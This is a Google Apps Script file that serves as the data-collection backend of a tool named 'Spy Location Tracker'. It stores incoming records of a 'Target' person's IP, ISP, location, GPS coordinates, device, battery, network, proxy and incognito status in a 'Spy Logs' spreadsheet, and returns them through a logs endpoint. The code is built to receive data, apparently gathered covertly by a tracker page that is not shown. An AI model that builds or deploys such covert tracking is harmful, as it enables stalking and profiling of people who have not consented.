const SHEET_NAME = 'Spy Logs';
const SHEET_HEADERS = [
  'Timestamp',
  'Type',
  'IP',
  'ISP',
  'Location',
  'Coords',
  'Timezone',
  'OS',
  'Browser',
  'Resolution',
  'Language',
  'Platform',
  'Target',
  'UserAgent',
  'BatteryLevel',
  'BatteryStatus',
  'NetworkType',
  'NetworkSpeed',
  'IsProxy',
  'IsIncognito',
  'Device'
];

function getSpreadsheet() {
  const props = PropertiesService.getScriptProperties();
  let spreadsheetId = props.getProperty('SPREADSHEET_ID');
  if (spreadsheetId) {
    try {
      return SpreadsheetApp.openById(spreadsheetId);
    } catch (e) {
      console.warn('Saved spreadsheet ID invalid, creating a new spreadsheet.');
      props.deleteProperty('SPREADSHEET_ID');
    }
  }

  const ss = SpreadsheetApp.create('Spy Location Tracker Logs');
  props.setProperty('SPREADSHEET_ID', ss.getId());
  return ss;
}

function getSheet() {
  const ss = getSpreadsheet();
  let sheet = ss.getSheetByName(SHEET_NAME);
  if (!sheet) {
    sheet = ss.insertSheet(SHEET_NAME);
    sheet.appendRow(SHEET_HEADERS);
  }
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(SHEET_HEADERS);
  }
  return sheet;
}

function createJsonResponse(payload, statusCode) {
  const content = ContentService.createTextOutput(JSON.stringify(payload));
  content.setMimeType(ContentService.MimeType.JSON);
  return content;
}

function doGet(e) {
  const action = (e.parameter.action || '').toLowerCase();
  if (action === 'logs') {
    const sheet = getSheet();
    const values = sheet.getDataRange().getValues();
    const headers = values.shift() || SHEET_HEADERS;
    const headerMap = {
      'Timestamp': 'timestamp',
      'Type': 'type',
      'IP': 'ip',
      'ISP': 'isp',
      'Location': 'location',
      'Coords': 'coords',
      'Timezone': 'timezone',
      'OS': 'os',
      'Browser': 'browser',
      'Resolution': 'resolution',
      'Language': 'language',
      'Platform': 'platform',
      'Target': 'target',
      'UserAgent': 'userAgent',
      'BatteryLevel': 'batteryLevel',
      'BatteryStatus': 'batteryStatus',
      'NetworkType': 'networkType',
      'NetworkSpeed': 'networkSpeed',
      'IsProxy': 'isProxy',
      'IsIncognito': 'isIncognito',
      'Device': 'device'
    };

    const logs = values
      .filter(row => row[0])
      .map(row => {
        const record = {};
        headers.forEach((header, idx) => {
          const key = headerMap[header] || header.replace(/\s+/g, '').toLowerCase();
          record[key] = row[idx];
        });
        return record;
      })
      .reverse();

    return createJsonResponse({ success: true, logs: logs });
  }

  return createJsonResponse({ success: true, message: 'Spy Tracker Apps Script is running.' });
}

function doPost(e) {
  try {
    const rawData = e.postData && e.postData.contents ? e.postData.contents : null;
    if (!rawData) {
      return createJsonResponse({ success: false, error: 'No request body received.' }, 400);
    }

    const payload = JSON.parse(rawData);
    const sheet = getSheet();
    const row = [
      new Date().toISOString(),
      payload.type || 'UNKNOWN',
      payload.ip || 'Unknown',
      payload.isp || 'Unknown',
      payload.location || 'Unknown',
      payload.coords || `${payload.lat || 0}, ${payload.lon || 0}`,
      payload.timezone || 'N/A',
      payload.os || 'Unknown OS',
      payload.browser || 'Unknown Browser',
      payload.resolution || 'N/A',
      payload.language || 'N/A',
      payload.platform || 'N/A',
      payload.target || 'N/A',
      payload.userAgent || 'N/A',
      payload.batteryLevel || 'N/A',
      payload.batteryStatus || 'N/A',
      payload.networkType || 'N/A',
      payload.networkSpeed || 'N/A',
      payload.isProxy || 'NO',
      payload.isIncognito || 'NO',
      payload.device || 'Unknown Device'
    ];

    sheet.appendRow(row);
    return createJsonResponse({ success: true, message: 'Row saved to spreadsheet.' });
  } catch (error) {
    return createJsonResponse({ success: false, error: error.message }, 500);
  }
}
